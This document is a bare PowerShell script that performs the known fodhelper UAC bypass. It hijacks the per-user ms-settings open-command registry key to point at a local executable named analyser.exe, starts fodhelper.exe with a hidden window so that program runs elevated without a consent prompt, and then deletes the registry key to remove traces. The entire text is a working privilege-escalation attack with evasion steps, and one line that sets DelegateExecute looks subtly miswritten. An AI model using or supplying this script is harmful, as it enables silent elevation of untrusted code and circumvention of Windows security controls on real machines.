$program = "C:\Users\DEEBYTE COMPUTERS\Documents\Js\assets\analyser.exe"
New-Item -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(default)" -Value $program
New-Item -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
Start-Sleep -Seconds 3
Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue
